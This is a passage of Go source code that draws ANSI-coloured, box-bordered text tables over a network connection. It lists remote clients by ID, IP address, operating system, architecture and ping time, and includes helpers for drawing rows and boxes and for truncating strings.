	for _, b := range infos[start:end] {
		id := trunc(strings.TrimSpace(b.ID), 16)
		if id == "" {
			id = "?"
		}
		ip := trunc(strings.TrimSpace(b.IP), 15)
		if ip == "" {
			ip = "-"
		}
		osf := trunc(strings.TrimSpace(b.Sys.OS), 12)
		if osf == "" {
			osf = "?"
		}
		arch := trunc(strings.TrimSpace(b.Sys.Arch), 6)
		ping := "-"
		if b.PingMs > 0 {
			ping = fmt.Sprintf("%dms", b.PingMs)
		}
		tblRow(c, fmt.Sprintf("   %-16s %-15s %-12s %-6s %s", id, ip, osf, arch, ping))
	}
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func tblRow(c net.Conn, s string) {
	s = trunc(s, 78)
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║%-78s║\n\r", s)))
}

func drawBox(c net.Conn, title, badge string, lines []string) {
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮")
	w(fmt.Sprintf("\x1b[38;5;231m║             § \x1b[38;5;51m%-20s\x1b[38;5;231m §         ║    ┌────────────────────┐    ║", title))
	w(fmt.Sprintf("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │ %-18s │    ║", badge))
	for _, l := range lines {
		if len(l) > 40 {
			l = l[:40]
		}
		w(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m %-40s ║    └────────────────────┘    ║", l))
	}
	w("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯")
}

func trunc(s string, max int) string {
	if max <= 0 {
		return ""
	}
	r := []rune(s)
	if len(r) <= max {
		return s
	}
	if max <= 3 {
		return string(r[:max])
	}
	return string(r[:max-3]) + "..."
}
